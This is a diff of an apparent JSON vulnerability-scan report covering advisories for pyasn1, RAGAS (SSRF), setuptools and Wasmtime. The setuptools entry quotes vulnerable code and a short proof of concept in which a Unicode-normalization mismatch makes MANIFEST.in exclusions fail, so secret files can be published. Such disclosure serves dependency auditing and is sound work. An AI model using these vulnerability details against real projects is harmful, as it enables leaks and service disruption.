-                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-hm4w-wwcw-mr6r"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59886"
-                },
-                {
-                  "type": "WEB",
-                  "url": "https://github.com/pyasn1/pyasn1/commit/e60c691cb91addb8fcefa2f537e85ede6fb1e886"
-                },
-                {
-                  "type": "PACKAGE",
-                  "url": "https://github.com/pyasn1/pyasn1"
-                },
-                {
-                  "type": "WEB",
-                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
-                }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "pyasn1: Uncontrolled resource consumption when converting decoded REAL values"
-            }
           ]
         },
         {
@@ -4667,30 +4598,30 @@
             "version": "0.4.3",
             "ecosystem": "PyPI"
           },
-          "groups": [
-            {
-              "ids": [
-                "PYSEC-2026-3046",
-                "GHSA-95ww-475f-pr4f"
-              ],
-              "aliases": [
-                "CVE-2026-6587",
-                "GHSA-95ww-475f-pr4f",
-                "PYSEC-2026-3046"
-              ],
-              "max_severity": "6.3"
-            }
-          ],
-          "licenses": [
-            "non-standard"
-          ],
           "vulnerabilities": [
             {
+              "modified": "2026-07-13T16:32:43Z",
+              "published": "2026-07-13T15:02:51Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-3046",
+              "aliases": [
+                "CVE-2026-6587",
+                "GHSA-95ww-475f-pr4f"
+              ],
+              "summary": "RAGAS has SSRF via Multi-Modal Faithfulness Collections Module",
+              "details": "A security flaw has been discovered in vibrantlabsai RAGAS up to 0.4.3. The affected element is the function _try_process_local_file/_try_process_url of the file src/ragas/metrics/collections/multi_modal_faithfulness/util.py of the component Collections Module. Performing a manipulation of the argument retrieved_contexts results in server-side request forgery. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The security patch for CVE-2025-45691 was applied to a different module only. The vendor was contacted early about this disclosure but did not respond in any way.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/ragas/PYSEC-2026-3046.yaml"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "ragas",
@@ -4698,6 +4629,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0.2.3"
@@ -4705,8 +4637,7 @@
                         {
                           "last_affected": "0.4.3"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -4744,17 +4675,12 @@
                     "0.4.1",
                     "0.4.2",
                     "0.4.3"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/ragas/PYSEC-2026-3046.yaml"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-6587",
-                "GHSA-95ww-475f-pr4f"
-              ],
-              "details": "A security flaw has been discovered in vibrantlabsai RAGAS up to 0.4.3. The affected element is the function _try_process_local_file/_try_process_url of the file src/ragas/metrics/collections/multi_modal_faithfulness/util.py of the component Collections Module. Performing a manipulation of the argument retrieved_contexts results in server-side request forgery. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The security patch for CVE-2025-45691 was applied to a different module only. The vendor was contacted early about this disclosure but did not respond in any way.",
-              "id": "PYSEC-2026-3046",
-              "modified": "2026-07-13T16:32:43.987086677Z",
-              "published": "2026-07-13T15:02:51.237201Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -4788,26 +4714,31 @@
                   "type": "ADVISORY",
                   "url": "https://github.com/advisories/GHSA-95ww-475f-pr4f"
                 }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
-                  "type": "CVSS_V3"
-                },
-                {
-                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P",
-                  "type": "CVSS_V4"
-                }
-              ],
-              "summary": "RAGAS has SSRF via Multi-Modal Faithfulness Collections Module"
+              ]
             },
             {
+              "modified": "2026-07-13T16:42:34Z",
+              "published": "2026-04-20T00:30:13Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-95ww-475f-pr4f",
+              "aliases": [
+                "CVE-2026-6587",
+                "PYSEC-2026-3046"
+              ],
+              "summary": "RAGAS has SSRF via Multi-Modal Faithfulness Collections Module",
+              "details": "A security flaw has been discovered in vibrantlabsai RAGAS up to 0.4.3. The affected element is the function _try_process_local_file/_try_process_url of the file src/ragas/metrics/collections/multi_modal_faithfulness/util.py of the component Collections Module. Performing a manipulation of the argument retrieved_contexts results in server-side request forgery. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The security patch for CVE-2025-45691 was applied to a different module only. The vendor was contacted early about this disclosure but did not respond in any way.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-95ww-475f-pr4f/GHSA-95ww-475f-pr4f.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "ragas",
@@ -4815,6 +4746,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0.2.3"
@@ -4822,8 +4754,7 @@
                         {
                           "last_affected": "0.4.3"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -4861,26 +4792,12 @@
                     "0.4.1",
                     "0.4.2",
                     "0.4.3"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-95ww-475f-pr4f/GHSA-95ww-475f-pr4f.json"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-6587",
-                "PYSEC-2026-3046"
-              ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-918"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-04-22T22:02:02Z",
-                "nvd_published_at": "2026-04-20T00:16:34Z",
-                "severity": "LOW"
-              },
-              "details": "A security flaw has been discovered in vibrantlabsai RAGAS up to 0.4.3. The affected element is the function _try_process_local_file/_try_process_url of the file src/ragas/metrics/collections/multi_modal_faithfulness/util.py of the component Collections Module. Performing a manipulation of the argument retrieved_contexts results in server-side request forgery. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The security patch for CVE-2025-45691 was applied to a different module only. The vendor was contacted early about this disclosure but did not respond in any way.",
-              "id": "GHSA-95ww-475f-pr4f",
-              "modified": "2026-07-13T16:42:34.978083453Z",
-              "published": "2026-04-20T00:30:13Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -4907,19 +4824,33 @@
                   "url": "https://vuldb.com/vuln/358222/cti"
                 }
               ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
-                  "type": "CVSS_V3"
-                },
-                {
-                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P",
-                  "type": "CVSS_V4"
-                }
-              ],
-              "summary": "RAGAS has SSRF via Multi-Modal Faithfulness Collections Module"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-04-22T22:02:02Z",
+                "nvd_published_at": "2026-04-20T00:16:34Z",
+                "severity": "LOW"
+              }
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2026-3046",
+                "GHSA-95ww-475f-pr4f"
+              ],
+              "aliases": [
+                "CVE-2026-6587",
+                "GHSA-95ww-475f-pr4f",
+                "PYSEC-2026-3046"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "licenses": [
+            "non-standard"
           ]
         },
         {
@@ -5128,32 +5059,26 @@
             "version": "82.0.1",
             "ecosystem": "PyPI"
           },
-          "groups": [
+          "vulnerabilities": [
             {
-              "ids": [
-                "PYSEC-2026-3447",
-                "GHSA-h35f-9h28-mq5c"
-              ],
+              "modified": "2026-07-14T10:56:37Z",
+              "published": "2026-07-08T17:17:27Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-3447",
               "aliases": [
                 "BIT-setuptools-2026-59890",
                 "CVE-2026-59890",
-                "GHSA-h35f-9h28-mq5c",
-                "PYSEC-2026-3447"
+                "GHSA-h35f-9h28-mq5c"
               ],
-              "max_severity": "6.1"
-            }
-          ],
-          "licenses": [
-            "MIT"
-          ],
-          "vulnerabilities": [
-            {
+              "details": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. Prior to 83.0.0, FileList applied MANIFEST.in exclude, global-exclude, recursive-exclude, and prune directives by matching compiled glob patterns against on-disk file names without Unicode normalization, so on macOS APFS or HFS+ an NFD file name could bypass an NFC exclusion rule and be packed into a source distribution. This issue is fixed in version 83.0.0.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/setuptools/PYSEC-2026-3447.yaml"
-                  },
-                  "ecosystem_specific": {},
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "setuptools",
@@ -5161,6 +5086,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -5168,8 +5094,7 @@
                         {
                           "fixed": "83.0.0"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -5796,18 +5721,12 @@
                     "9.0",
                     "9.0.1",
                     "9.1"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/setuptools/PYSEC-2026-3447.yaml"
+                  }
                 }
               ],
-              "aliases": [
-                "BIT-setuptools-2026-59890",
-                "CVE-2026-59890",
-                "GHSA-h35f-9h28-mq5c"
-              ],
-              "details": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. Prior to 83.0.0, FileList applied MANIFEST.in exclude, global-exclude, recursive-exclude, and prune directives by matching compiled glob patterns against on-disk file names without Unicode normalization, so on macOS APFS or HFS+ an NFD file name could bypass an NFC exclusion rule and be packed into a source distribution. This issue is fixed in version 83.0.0.",
-              "id": "PYSEC-2026-3447",
-              "modified": "2026-07-14T10:56:37.948360943Z",
-              "published": "2026-07-08T17:17:27.020Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -5821,21 +5740,31 @@
                   "type": "EVIDENCE",
                   "url": "https://github.com/pypa/setuptools/security/advisories/GHSA-h35f-9h28-mq5c"
                 }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
-                  "type": "CVSS_V3"
-                }
               ]
             },
             {
+              "modified": "2026-07-23T09:29:39Z",
+              "published": "2026-07-21T19:09:21Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-h35f-9h28-mq5c",
+              "aliases": [
+                "BIT-setuptools-2026-59890",
+                "CVE-2026-59890",
+                "PYSEC-2026-3447"
+              ],
+              "related": [
+                "CGA-cvf4-h23f-fpjm"
+              ],
+              "summary": "setuptools: MANIFEST.in exclusion bypass in sdist via Unicode normalization collision (NFC/NFD) on macOS APFS/HFS+",
+              "details": "## Summary\n\nWhen building a source distribution (`python -m build --sdist` / `setup.py sdist`), setuptools' `FileList` applies `MANIFEST.in` directives (`exclude`, `global-exclude`, `recursive-exclude`, `prune`) by matching a compiled glob against on-disk file names **byte-for-byte, with no Unicode normalization**. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a `MANIFEST.in` rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the `.tar.gz` and, if published, uploaded to the public, immutable PyPI index.\n\n## Details\n\nFile names in `FileList.files` come from `os.walk` (`setuptools/_distutils/filelist.py`, `_find_all_simple`), so on APFS a file written NFD is offered to the matcher in NFD, while the `MANIFEST.in` pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:\n\n```python\n# setuptools/command/egg_info.py  (FileList.global_exclude)\ndef global_exclude(self, pattern):\n    match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -> regex, no NFC/NFD\n    return self._remove_files(match.match)                   # byte-level regex over raw os.walk names\n```\n\nA rule written NFC (`caf\u00e9` = `63 61 66 c3 a9`) does not match an on-disk name written NFD (`caf\u00e9` = `63 61 66 65 cc 81`), even though the filesystem treats the two as one file.\n\nA `unicodedata.normalize('NFD', ...)` helper exists in `setuptools/unicode_utils.py` (`decompose()`), but it is **never called in the manifest matching path**, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, `EggInfoCommand._manifest_normalize`, uses `filesys_decode` (bytes\u2192str decode only, no NFC/NFD) and runs when writing `SOURCES.txt`, after matching has already occurred.\n\n## Impact\n\n`MANIFEST.in` exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule \u2014 an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.\n\n## Proof of concept\n\nWith a project containing `MANIFEST.in`:\n\n```\nglobal-include *.txt *.json\nglobal-exclude secret_caf\u00e9.txt    # rule saved NFC\n```\n\nand an on-disk file `secret_caf\u00e9.txt` written in NFD, `python -m build --sdist` packs the secret file into the resulting `.tar.gz`, while an ASCII control file excluded by the same directive is correctly dropped \u2014 isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.\n\n## Remediation\n\nNormalize both the walked path and each `MANIFEST.in` pattern to a single canonical form before matching, in both `setuptools/command/egg_info.py` (`FileList`) and the vendored `setuptools/_distutils/filelist.py`. For an exclusion list, err toward excluding more, and document that `MANIFEST.in` matching is normalization-insensitive on macOS.\n\n## Credit\n\nReported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-h35f-9h28-mq5c/GHSA-h35f-9h28-mq5c.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "setuptools",
@@ -5843,6 +5772,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -5850,8 +5780,7 @@
                         {
                           "fixed": "83.0.0"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -6478,28 +6407,12 @@
                     "9.0",
                     "9.0.1",
                     "9.1"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-h35f-9h28-mq5c/GHSA-h35f-9h28-mq5c.json"
+                  }
                 }
               ],
-              "aliases": [
-                "BIT-setuptools-2026-59890",
-                "CVE-2026-59890",
-                "PYSEC-2026-3447"
-              ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-176",
-                  "CWE-697"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T19:09:21Z",
-                "nvd_published_at": "2026-07-08T17:17:27Z",
-                "severity": "MODERATE"
-              },
-              "details": "## Summary\n\nWhen building a source distribution (`python -m build --sdist` / `setup.py sdist`), setuptools' `FileList` applies `MANIFEST.in` directives (`exclude`, `global-exclude`, `recursive-exclude`, `prune`) by matching a compiled glob against on-disk file names **byte-for-byte, with no Unicode normalization**. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a `MANIFEST.in` rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the `.tar.gz` and, if published, uploaded to the public, immutable PyPI index.\n\n## Details\n\nFile names in `FileList.files` come from `os.walk` (`setuptools/_distutils/filelist.py`, `_find_all_simple`), so on APFS a file written NFD is offered to the matcher in NFD, while the `MANIFEST.in` pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:\n\n```python\n# setuptools/command/egg_info.py  (FileList.global_exclude)\ndef global_exclude(self, pattern):\n    match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -> regex, no NFC/NFD\n    return self._remove_files(match.match)                   # byte-level regex over raw os.walk names\n```\n\nA rule written NFC (`caf\u00e9` = `63 61 66 c3 a9`) does not match an on-disk name written NFD (`caf\u00e9` = `63 61 66 65 cc 81`), even though the filesystem treats the two as one file.\n\nA `unicodedata.normalize('NFD', ...)` helper exists in `setuptools/unicode_utils.py` (`decompose()`), but it is **never called in the manifest matching path**, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, `EggInfoCommand._manifest_normalize`, uses `filesys_decode` (bytes\u2192str decode only, no NFC/NFD) and runs when writing `SOURCES.txt`, after matching has already occurred.\n\n## Impact\n\n`MANIFEST.in` exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule \u2014 an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.\n\n## Proof of concept\n\nWith a project containing `MANIFEST.in`:\n\n```\nglobal-include *.txt *.json\nglobal-exclude secret_caf\u00e9.txt    # rule saved NFC\n```\n\nand an on-disk file `secret_caf\u00e9.txt` written in NFD, `python -m build --sdist` packs the secret file into the resulting `.tar.gz`, while an ASCII control file excluded by the same directive is correctly dropped \u2014 isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.\n\n## Remediation\n\nNormalize both the walked path and each `MANIFEST.in` pattern to a single canonical form before matching, in both `setuptools/command/egg_info.py` (`FileList`) and the vendored `setuptools/_distutils/filelist.py`. For an exclusion list, err toward excluding more, and document that `MANIFEST.in` matching is normalization-insensitive on macOS.\n\n## Credit\n\nReported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762.",
-              "id": "GHSA-h35f-9h28-mq5c",
-              "modified": "2026-07-21T19:15:32.059653102Z",
-              "published": "2026-07-21T19:09:21Z",
               "references": [
                 {
                   "type": "WEB",
@@ -6526,15 +6439,35 @@
                   "url": "https://github.com/pypa/setuptools/releases/tag/v83.0.0"
                 }
               ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "setuptools: MANIFEST.in exclusion bypass in sdist via Unicode normalization collision (NFC/NFD) on macOS APFS/HFS+"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-176",
+                  "CWE-697"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T19:09:21Z",
+                "nvd_published_at": "2026-07-08T17:17:27Z",
+                "severity": "MODERATE"
+              }
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2026-3447",
+                "GHSA-h35f-9h28-mq5c"
+              ],
+              "aliases": [
+                "BIT-setuptools-2026-59890",
+                "CVE-2026-59890",
+                "GHSA-h35f-9h28-mq5c",
+                "PYSEC-2026-3447"
+              ],
+              "max_severity": "6.1"
+            }
+          ],
+          "licenses": [
+            "MIT"
           ]
         },
         {
@@ -6755,16 +6688,6 @@
           },
           "licenses": [
             "non-standard"
-          ]
-        },
-        {
-          "package": {
-            "name": "tomli-w",
-            "version": "1.2.0",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "MIT"
           ]
         },
         {
@@ -6993,31 +6916,26 @@
             "version": "43.0.0",
             "ecosystem": "PyPI"
           },
-          "groups": [
+          "vulnerabilities": [
             {
-              "ids": [
-                "PYSEC-2026-151"
-              ],
+              "modified": "2026-05-21T15:00:24Z",
+              "published": "2026-04-09T19:16:24Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-151",
               "aliases": [
                 "CVE-2026-34983",
                 "GHSA-hfr4-7c6c-48w2",
-                "PYSEC-2026-151",
                 "RUSTSEC-2026-0090"
               ],
-              "max_severity": "5.0"
-            }
-          ],
-          "licenses": [
-            "Apache-2.0 WITH LLVM-exception"
-          ],
-          "vulnerabilities": [
-            {
+              "details": "Wasmtime is a runtime for WebAssembly. In 43.0.0, cloning a wasmtime::Linker is unsound and can result in use-after-free bugs. This bug is not controllable by guest Wasm programs. It can only be triggered by a specific sequence of embedder API calls made by the host. Specifically, the following steps must occur to trigger the bug clone a wasmtime::Linker, drop the original linker instance, use the new, cloned linker instance, resulting in a use-after-free. This vulnerability is fixed in 43.0.1.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/wasmtime/PYSEC-2026-151.yaml"
-                  },
-                  "ecosystem_specific": {},
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "wasmtime",
@@ -7025,6 +6943,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -7032,8 +6951,7 @@
                         {
                           "last_affected": "43.0.0"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -7124,32 +7042,36 @@
                     "8.0.0",
                     "8.0.1",
                     "9.0.0"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/wasmtime/PYSEC-2026-151.yaml"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-34983",
-                "GHSA-hfr4-7c6c-48w2",
-                "RUSTSEC-2026-0090"
-              ],
-              "details": "Wasmtime is a runtime for WebAssembly. In 43.0.0, cloning a wasmtime::Linker is unsound and can result in use-after-free bugs. This bug is not controllable by guest Wasm programs. It can only be triggered by a specific sequence of embedder API calls made by the host. Specifically, the following steps must occur to trigger the bug clone a wasmtime::Linker, drop the original linker instance, use the new, cloned linker instance, resulting in a use-after-free. This vulnerability is fixed in 43.0.1.",
-              "id": "PYSEC-2026-151",
-              "modified": "2026-05-21T15:00:24.330171463Z",
-              "published": "2026-04-09T19:16:24.850Z",
               "references": [
                 {
                   "type": "ADVISORY",
                   "url": "https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-hfr4-7c6c-48w2"
                 }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H",
-                  "type": "CVSS_V3"
-                }
               ]
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2026-151"
+              ],
+              "aliases": [
+                "CVE-2026-34983",
+                "GHSA-hfr4-7c6c-48w2",
+                "PYSEC-2026-151",
+                "RUSTSEC-2026-0090"
+              ],
+              "max_severity": "5.0"
+            }
+          ],
+          "licenses": [
+            "Apache-2.0 WITH LLVM-exception"
           ]
         },
         {
@@ -7284,11 +7206,11 @@
   "license_summary": [
     {
       "name": "MIT",
-      "count": 128
+      "count": 127
     },
     {
       "name": "Apache-2.0",
-      "count": 87
+      "count": 80
     },
     {
       "name": "non-standard",
